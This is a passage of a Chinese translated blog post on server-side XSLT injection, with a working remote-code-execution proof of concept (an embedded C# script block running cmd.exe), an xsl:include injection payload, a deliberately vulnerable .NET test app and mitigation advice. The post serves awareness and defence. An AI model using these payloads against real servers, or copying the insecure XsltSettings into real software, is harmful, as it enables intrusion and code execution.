+<h4 id="嵌入脚本区块执行远程代码"><a href="#嵌入脚本区块执行远程代码" class="headerlink" title="嵌入脚本区块执行远程代码"></a>嵌入脚本区块执行远程代码</h4><p>嵌入的脚本区块是专有的XSLT扩展，可以直接在XSLT文档中包含代码。在微软的实现中，可以包含C#代码。当文档被解析，远程服务器会编译然后执行代码。</p>
+<p>下面的XSLT文档是一个POC，作用是列出当前目录下的所有文件。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></div><div class="line"><span class="attr">xmlns:msxsl</span>=<span class="string">"urn:schemas-microsoft-com:xslt"</span></div><div class="line"><span class="attr">xmlns:user</span>=<span class="string">"urn:my-scripts"</span>&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">msxsl:script</span> <span class="attr">language</span> = <span class="string">"C#"</span> <span class="attr">implements-prefix</span> = <span class="string">"user"</span>&gt;</span></div><div class="line">&lt;![CDATA[</div><div class="line">public string execute()&#123;</div><div class="line">System.Diagnostics.Process proc = new System.Diagnostics.Process();</div><div class="line">proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";</div><div class="line">proc.StartInfo.RedirectStandardOutput = true;</div><div class="line">proc.StartInfo.UseShellExecute = false;</div><div class="line">proc.StartInfo.Arguments = "/c dir";</div><div class="line">proc.Start();</div><div class="line">proc.WaitForExit();</div><div class="line">return proc.StandardOutput.ReadToEnd();</div><div class="line">&#125;</div><div class="line">]]&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">msxsl:script</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">  --- BEGIN COMMAND OUTPUT ---</div><div class="line">	<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"user:execute()"</span>/&gt;</span></div><div class="line">  --- END COMMAND OUTPUT ---	</div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>首先我们在“xsl：stylesheet”标签中定义了两个新的XML前缀。第一个“xmlns：msxsl”用来启用Microsoft的专有扩展格式，第二个“xmlns：user”声明了“msxsl：script”脚本块实现的自定义用户扩展接口。</p>
+<p>C#代码实现了execute()函数，用于执行”cmd.exe /c dir”命令并将结果以字符串形式返回。最后函数是在“xsl:value-of”标签中调用。</p>
+<p>该转换的结果等同于命令”dir”执行的输出：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">--- BEGIN COMMAND OUTPUT ---</div><div class="line">         Volume in drive C has no label.</div><div class="line"> Volume Serial Number is EC7C-74AD</div><div class="line"></div><div class="line"> Directory of C:\Users\context\Documents\Visual Studio 2015\Projects\XsltConsole</div><div class="line">Application\XsltConsoleApplication\bin\Debug</div><div class="line"></div><div class="line">22/02/2017  15:19    <span class="tag">&lt;<span class="name">DIR</span>&gt;</span>          .</div><div class="line">22/02/2017  15:19    <span class="tag">&lt;<span class="name">DIR</span>&gt;</span>          ..</div><div class="line">22/02/2017  13:30               258 data.xml</div><div class="line">22/02/2017  14:48               233 external_transform.xslt</div><div class="line">22/02/2017  15:15                12 secretfruit.txt</div><div class="line">31/01/2017  13:45               154 secretfruit.xml</div><div class="line">22/02/2017  15:29               831 transform.xslt</div><div class="line">22/02/2017  13:49             7,168 XsltConsoleApplication.exe</div><div class="line">26/01/2017  15:42               189 XsltConsoleApplication.exe.config</div><div class="line">22/02/2017  13:49            11,776 XsltConsoleApplication.pdb</div><div class="line">               8 File(s)         20,621 bytes</div><div class="line">               2 Dir(s)   9,983,107,072 bytes free</div><div class="line"></div><div class="line">  --- END COMMAND OUTPUT ---</div></pre></td></tr></table></figure>
+<h4 id="import和incldue曲线救国"><a href="#import和incldue曲线救国" class="headerlink" title="import和incldue曲线救国"></a>import和incldue曲线救国</h4><p>import和include标签可用于组合多个XSLT文档。如果我们碰到了这么一种情况（只能在XSLT文档的中间部分注入字符），那么直接使用XXE攻击或者include脚本都是不可能的，因为这两种手法都要求注入点在文档的顶部。</p>
+<p>攻击者通过将XSLT文档和外部文档组合来打破这种限制，import和incldue函数可以达到这样的效果。在加载外部文件时，整个文档将被解析。如果攻击者可以控制这个过程，那么他们可以使用XXE和在外部文件中使用内嵌脚本这两种攻击方式。</p>
+<p>外部文件可能是之前上传到服务器上的文件，只要文件内容是XML格式那扩展名是什么就没关系了。当然外部文件也可能是攻击者服务器上的一个文件，通过URL来引用。</p>
+<p>当“xsl:include”在其他地方使用时，“xsl:import”标签只能作为“xsl:stylesheet”标签的第一个子标签。</p>
+<p>接着让我们使用之前的XSLT文档吧，假设我们只能在字符串“Your Company Name Here” 中进行注入：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=”1.0” encoding=”utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    Your Company Name Here</div><div class="line">    Fruits:</div><div class="line">	    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>在上面的转换中，我们想包含下面名为external_transform.xslt的外部文件。为了使事情简单化，外部转换只打印简要的信息；然而外部转换可以用之前提到过的任何攻击所代替（包括那些需要在文档顶部进行声明的攻击手法），比如内嵌的脚本区块在上述转换中不能直接注入。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></div><div class="line">	 Hello from the external transformation</div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>为了包含外部文档，我们需要注入如下标签：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span></div></pre></td></tr></table></figure>
+<p>然而，这存在一个问题：“xsl:include” 不能被“xsl:template”包含并且转换后的文件必须是格式良好的XML文档。所以我们的第一步是要闭合该标签“xsl:template”，接着添加“xsl:incldue”标签，这就能满足第一个要求了。为了获取到格式良好的XML文档，在“xsl:incldue”标签后我们需要再次打开“xsl:template”标签。</p>
+<p>生成的攻击载荷如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">name</span>=<span class="string">"a"</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>在注入后，生成的XSLT文档看起来是这样的：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">name</span>=<span class="string">"a"</span>&gt;</span></div><div class="line">    Fruits:</div><div class="line">    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>转换后将生成如下输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hello from the external transformation</div></pre></td></tr></table></figure>
+<p>和XXE、document()函数一样，import和include标签可以用来数据窃取和基本的端口扫描。</p>
+<h2 id="XSLT—-导致app易受攻击"><a href="#XSLT—-导致app易受攻击" class="headerlink" title="XSLT—-导致app易受攻击"></a>XSLT—-导致app易受攻击</h2><p>在识别出XSLT漏洞后，编写能工作的exp是比较棘手的。</p>
+<p>这有一部分是因为xml严格的语法要求，另一部分是因为应用程序的实现细节。</p>
+<p>测试</p>
+<p>所以我写了一个小型易受攻击的.Net控制台应用程序，可用于测试前面所提到的攻击。该应用是由.Net’s System.Xml 实现的。带有注释的完整代码报告如下，可以通过Microsoft Visual Studio来编译。代码和已经编译好的应用可以在这里<a href="https://github.com/ctxis/VulnerableXsltConsoleApplication" target="_blank" rel="external">下载</a>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Xml;</div><div class="line">using System.Xml.Xsl;</div><div class="line"></div><div class="line">namespace XsltConsoleApplication</div><div class="line">&#123;</div><div class="line">    class Program</div><div class="line">    &#123;</div><div class="line">        /*</div><div class="line">        This code contains serious vulnerabilities and is provided for training purposes only!</div><div class="line">        DO NOT USE ANYWHERE FOR ANYTHING ELSE!!!</div><div class="line">        */</div><div class="line">        static void Main(string[] args)</div><div class="line">        &#123;</div><div class="line">            Console.WriteLine(&quot;\n#####################################################################&quot;);</div><div class="line">            Console.WriteLine(&quot;#                                                                   #&quot;);</div><div class="line">            Console.WriteLine(&quot;# This is a Vulnerable-by-Design application to test XSLT Injection #&quot;);</div><div class="line">            Console.WriteLine(&quot;#                                                                   #&quot;);</div><div class="line">            Console.WriteLine(&quot;#####################################################################\n&quot;);</div><div class="line">            Console.WriteLine(&quot;The application expects (in the current working directory):&quot;);</div><div class="line">            Console.WriteLine(&quot; - an XML file (data.xml) and\n - an XSLT style sheet (transform.xslt)\n&quot;);</div><div class="line">            Console.WriteLine(&quot;===================================================================&quot;);</div><div class="line"></div><div class="line">            String transformationXsltFileURI = &quot;transform.xslt&quot;;</div><div class="line">            String dataXMLFileURI = &quot;data.xml&quot;;</div><div class="line"></div><div class="line">            // Enable DTD processing to load external XML entities for both the XML and XSLT file</div><div class="line">            XmlReaderSettings vulnerableXmlReaderSettings = new XmlReaderSettings();</div><div class="line">            vulnerableXmlReaderSettings.DtdProcessing = DtdProcessing.Parse;</div><div class="line">            vulnerableXmlReaderSettings.XmlResolver = new XmlUrlResolver();</div><div class="line">            XmlReader vulnerableXsltReader = XmlReader.Create(transformationXsltFileURI, vulnerableXmlReaderSettings);</div><div class="line">            XmlReader vulnerableXmlReader = XmlReader.Create(dataXMLFileURI, vulnerableXmlReaderSettings);</div><div class="line"></div><div class="line">            XsltSettings vulnerableSettings = new XsltSettings();</div><div class="line">            // Embedded script blocks and the document() function are NOT enabled by default</div><div class="line">            vulnerableSettings.EnableDocumentFunction = true;</div><div class="line">            vulnerableSettings.EnableScript = true;</div><div class="line">            // A vulnerable settings class can also be created with:</div><div class="line">            // vulnerableSettings = XsltSettings.TrustedXslt;</div><div class="line"></div><div class="line">            XslCompiledTransform vulnerableTransformation = new XslCompiledTransform();</div><div class="line">            // XmlUrlResolver is the default resolver for XML and XSLT and supports the file: and http: protocols</div><div class="line">            XmlUrlResolver vulnerableResolver = new XmlUrlResolver();</div><div class="line">            vulnerableTransformation.Load(vulnerableXsltReader, vulnerableSettings, vulnerableResolver);  </div><div class="line"></div><div class="line">            XmlWriter output = new XmlTextWriter(Console.Out);</div><div class="line"></div><div class="line">            // Run the transformation</div><div class="line">            vulnerableTransformation.Transform(vulnerableXmlReader, output);   </div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>该应用需要data.xml和transformation.xslt文件在当前工作目录下。</p>
+<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><p>如果你的应用使用了XSLT，通过下列引导你可以降低风险：</p>
+<ul>
+<li>尽可能避免使用用户提供的XSLT文档</li>
+<li>不要使用不受信任的输入去生成XSLT文档，比如拼接字符串。如果需要非静态值，则应将其包含在XML数据文件中，并且仅由XSLT文档引用</li>
+<li>明确禁止使用XSLT库实现的危险功能。查阅库的文档如何禁用XML外部实体、document()函数、import和include标签。确保嵌入脚本扩展是禁用的，同时其他允许读或写外部文件的专用扩展也被禁用了。</li>
+</ul>
+<p>Emanuel Duss和Roland Bischofberger写了一份文档，讲述了流行的XSLT库实现的功能和他们的默认配置。文档的34页包含了一张便捷比较表格，可以作为入手点。<a href="https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf." target="_blank" rel="external">点我下载PDF</a></p>
+<h2 id="总结和结论"><a href="#总结和结论" class="headerlink" title="总结和结论"></a>总结和结论</h2><p>XSLT是非常有用的工具，许多应用都用了，但它的问题并不那么为人所知。差的代码实践会引入漏洞，这可能会导致应用控制权的完全丧失和数据被窃取。本文致力于提高大家的意识，通过展示一些可能的攻击手法和引导建议来避免常见的实现上的问题。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Inject/" rel="tag"># Inject</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017-09-14-attack-sql-server-clr/" rel="next" title="【译】攻击SQL Server的CLR库">
+                <i class="fa fa-chevron-left"></i> 【译】攻击SQL Server的CLR库
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017-11-07-Signing-Into-Billion-Mobile-Apps-Effortlessly-With-OAuth20/" rel="prev" title="【译】通过OAuth2.0可轻松登录数百万手机应用账号">
+                【译】通过OAuth2.0可轻松登录数百万手机应用账号 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODY0MC81MjEx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Ꭰ</p>
+              <p class="site-description motion-element" itemprop="description">Me. a lazy person</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://suroot.cn" title="c0rpse" target="_blank">c0rpse</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.th1s.cn" title="th1s" target="_blank">th1s</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jkme.github.io" title="jkme" target="_blank">jkme</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是XSLT"><span class="nav-number">1.</span> <span class="nav-text">什么是XSLT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用XSLT服务端注入"><span class="nav-number">2.</span> <span class="nav-text">利用XSLT服务端注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#发现存在漏洞的切入点"><span class="nav-number">2.0.1.</span> <span class="nav-text">发现存在漏洞的切入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#system-property-函数和指纹"><span class="nav-number">2.0.2.</span> <span class="nav-text">system-property()函数和指纹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据窃取和使用XXE进行端口扫描"><span class="nav-number">2.0.3.</span> <span class="nav-text">数据窃取和使用XXE进行端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#嵌入脚本区块执行远程代码"><span class="nav-number">2.0.4.</span> <span class="nav-text">嵌入脚本区块执行远程代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#import和incldue曲线救国"><span class="nav-number">2.0.5.</span> <span class="nav-text">import和incldue曲线救国</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSLT—-导致app易受攻击"><span class="nav-number">3.</span> <span class="nav-text">XSLT—-导致app易受攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#推荐"><span class="nav-number">4.</span> <span class="nav-text">推荐</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结和结论"><span class="nav-number">5.</span> <span class="nav-text">总结和结论</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ꭰ</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
